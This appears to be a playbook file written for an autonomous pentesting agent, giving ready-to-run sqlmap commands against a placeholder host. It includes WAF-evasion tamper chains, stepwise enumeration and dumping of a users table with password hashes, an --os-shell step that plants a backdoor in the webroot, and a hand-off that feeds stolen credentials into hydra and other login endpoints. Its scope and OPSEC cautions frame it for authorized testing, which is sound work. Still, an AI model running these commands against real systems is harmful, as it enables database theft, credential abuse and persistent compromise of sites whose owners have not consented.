---
name: sqlmap playbook
description: sqlmap reference for non-interactive scans, technique selection, tamper chains, and bounded enumeration / dumping workflows.
---

# sqlmap Playbook

Reference for parameter-targeted SQL injection probing, technique tuning, WAF evasion, and bounded data extraction. Pull this in when you need to recall flag interactions, pick the right `--technique` letters, or chain `--tamper` scripts against a filter.

Upstream: https://github.com/sqlmapproject/sqlmap/wiki/usage

## RedAmon wiring

| Action | Tool | Notes |
|---|---|---|
| Run sqlmap | `kali_shell` | No dedicated wrapper. Always pass `--batch`. |
| Capture a request file | `kali_shell` | Save Burp/proxy export under `/tmp/req.txt` and feed via `-r`. |
| Inspect output and dumps | `kali_shell` | sqlmap writes to `~/.local/share/sqlmap/output/<host>/`. |
| Multi-line custom payload research | `execute_code` | Use Python when crafting tamper modules or bespoke time-blind probes. |

## Canonical shape

```
sqlmap (-u URL_with_params | -r req.txt) [-p param] --batch [tuning] [enum/dump]
```

Always run with `--batch` in agent context. Default to a request file (`-r`) when the target is authenticated, has multipart bodies, or uses non-trivial headers; the file captures cookies, JSON content-type, and exact whitespace.

## Flag reference

### Targeting and transport

| Flag | Purpose |
|---|---|
| `-u <url>` | Target URL (params via `?a=1&b=2` or `*` placeholders) |
| `-r <file>` | Raw HTTP request file |
| `-p <param>` | Restrict to specific parameter(s), comma-separated |
| `--data 'k=v'` | Inline POST body |
| `--cookie 'k=v;...'` | Authenticated session |
| `--headers 'K: V\nK2: V2'` | Custom headers |
| `--method <verb>` | HTTP method |
| `--forms` | Auto-parse and test forms on the URL |
| `--random-agent` | Pick a random UA |
| `--proxy <url>` | Upstream proxy |
| `--ignore-proxy` | Bypass any configured proxy |
| `--timeout <s>` / `--retries <n>` | Transport stability |
| `--threads <n>` | Concurrent requests (cap at 10) |

### Detection tuning

| Flag | Purpose |
|---|---|
| `--level <1-5>` | Test depth (params tested, payloads tried) |
| `--risk <1-3>` | Payload risk (3 includes destructive UPDATE-based) |
| `--technique <BEUSTQ>` | Boolean / Error / Union / Stacked / Time / inline-Query |
| `--dbms <name>` | Pin DBMS (`mysql`, `postgresql`, `mssql`, `oracle`, `sqlite`) |
| `--prefix '<str>'` `--suffix '<str>'` | Wrap payloads when context is known |
| `--tamper <scripts>` | Comma-separated tamper modules |
| `--time-sec <n>` | Delay seconds for time-based |
| `--union-cols <range>` | Union column probe range (`6-10`) |
| `--flush-session` | Clear cached scan state for retest |

### Enumeration and dump

| Flag | Purpose |
|---|---|
| `--current-user` `--current-db` `--hostname` `--privileges` | Quick metadata |
| `--dbs` | List databases |
| `-D <db> --tables` | List tables in a database |
| `-D <db> -T <table> --columns` | List columns |
| `-D <db> -T <table> -C <cols> --dump` | Dump narrow column set |
| `--dump-all` | Dump every accessible row (avoid in scope-limited tests) |
| `--os-shell` `--os-cmd` | Out-of-band OS command via `xp_cmdshell` / file write / UDF |
| `--file-read <path>` `--file-write <local> --file-dest <remote>` | File I/O when DBMS supports it |

## Default safe baseline

```
kali_shell: sqlmap -u "https://target.tld/item?id=1" -p id --batch --level 2 --risk 1 --threads 5 --timeout 10 --retries 1 --random-agent --output-dir /tmp/sqlmap
```

## Recipes

### Confirm a single GET parameter

```
kali_shell: sqlmap -u "https://target.tld/item?id=1" -p id --batch --level 2 --risk 1 --threads 5 --output-dir /tmp/sqlmap
```

### Authenticated POST endpoint

```
kali_shell: sqlmap -u "https://target.tld/login" --data 'user=admin&pass=test' -p pass --cookie 'session=...' --batch --level 3 --risk 2 --threads 5
```

### Request-file driven (mirrors browser exactly)

```
kali_shell: sqlmap -r /tmp/req.txt -p id --batch --level 3 --risk 2 --random-agent --output-dir /tmp/sqlmap
```

### JSON body injection (mark with `*`)

```
kali_shell: sqlmap -u "https://target.tld/api/search" --method POST --data '{"q":"*"}' --headers 'Content-Type: application/json' --batch --level 3
```

### Form-driven sweep (login pages, search bars)

```
kali_shell: sqlmap -u "https://target.tld/login" --forms --batch --level 2 --risk 1 --random-agent
```

### Time-based blind (only technique)

```
kali_shell: sqlmap -u "https://target.tld/item?id=1" -p id --technique T --time-sec 5 --batch --level 3 --risk 2
```

### Enumerate + narrow dump

```
kali_shell: sqlmap -u "https://target.tld/item?id=1" -p id --batch --dbs
kali_shell: sqlmap -u "https://target.tld/item?id=1" -p id --batch -D appdb --tables
kali_shell: sqlmap -u "https://target.tld/item?id=1" -p id --batch -D appdb -T users --columns
kali_shell: sqlmap -u "https://target.tld/item?id=1" -p id --batch -D appdb -T users -C id,email,password_hash,role --dump
```

### Out-of-band shell (DBMS-dependent)

```
kali_shell: sqlmap -u "https://target.tld/item?id=1" -p id --batch --os-shell
```

### Captured traffic (proxy_brain tools)

When HTTP Traffic Capture is enabled, the `-r` request-file flow is captured-traffic-native: redamon.to_curl(id) and redamon.get(id) render a captured transaction back to a raw request or curl you can drop into `/tmp/req.txt` and feed via `-r`, no re-run of the original tool needed. Find candidate injection points with redamon.params (injectability heuristic) and redamon.search; redamon.replay reproduces an authenticated request (host pinned to origin) to reach injection points behind a session. redamon.diff(id_a, id_b) is the in-platform boolean-blind true/false comparison, and redamon.fuzz iterates payloads over one query param.

## Tamper chains for common WAFs

Combine modules with comma. Order matters; later modules act on the output of earlier ones.

| WAF / filter | Useful chain |
|---|---|
| Generic regex on quotes / spaces | `between,randomcase,space2comment` |
| ModSecurity CRS | `between,bluecoat,modsecurityversioned,modsecurityzeroversioned` |
| MySQL keyword filter | `between,randomcomments,modsecurityzeroversioned` |
| MSSQL keyword filter | `between,charunicodeencode,space2mssqlblank` |
| Cloudflare cosmetic blocks | `space2comment,between,randomcase,charencode` |

```
kali_shell: sqlmap -u "https://target.tld/item?id=1" -p id --batch --level 3 --risk 2 --tamper between,randomcase,space2comment --random-agent
```

List all available modules:

```
kali_shell: sqlmap --list-tampers
```

## Technique letters

`B` boolean blind, `E` error-based, `U` union, `S` stacked queries, `T` time-based, `Q` inline query.

| Goal | Suggested order |
|---|---|
| Fast confirmation | `BEU` (skip stacked/time) |
| Output is suppressed (200 always) | `BT` (boolean and time only) |
| Want stacked-query side effects | `BEUS` |
| Slow target / unstable | `BT --time-sec 8 --retries 3` |

## Common pitfalls

- Manual confirmation passes but sqlmap says "not injectable" -> rerun with `--flush-session`, raise `--level/--risk`, and pin `--dbms`.
- Hangs on time-based -> raise `--time-sec` and lower `--threads`. Network jitter ruins time-based scoring.
- WAF returning 403 / 429 -> lower `--threads`, add `--random-agent`, swap to `-r req.txt` to keep an exact UA, layer a `--tamper` chain.
- POST with JSON returns 415 -> set `--headers 'Content-Type: application/json'` and mark injection point with `*` inside the JSON body.
- Binary search for boolean blind is slow -> add `--prefix` and `--suffix` to remove guess loops once you know the syntactic context.
- Dump too broad -> always prefer `-D/-T/-C` over `--dump-all`.

## Scope and OPSEC

- `--risk 3` includes UPDATE-based payloads that can mutate data. Confirm engagement scope before raising risk above 2.
- `--os-shell` writes a backdoor file under the webroot via `INTO OUTFILE` or stored procedures; treat it as a Phase-2 finding, not a recon move.
- Output directory holds raw responses and dumps. Wipe with `rm -rf /tmp/sqlmap` at end of engagement.

## Hand-off

```
kali_shell: ls -la /tmp/sqlmap/<host>/
kali_shell: cat /tmp/sqlmap/<host>/log         # findings summary
kali_shell: cat /tmp/sqlmap/<host>/dump/*.csv  # per-table dump
```

Feed extracted credentials into `execute_hydra` or downstream login endpoints. Push schema/topology facts into the graph through subsequent `query_graph` updates.
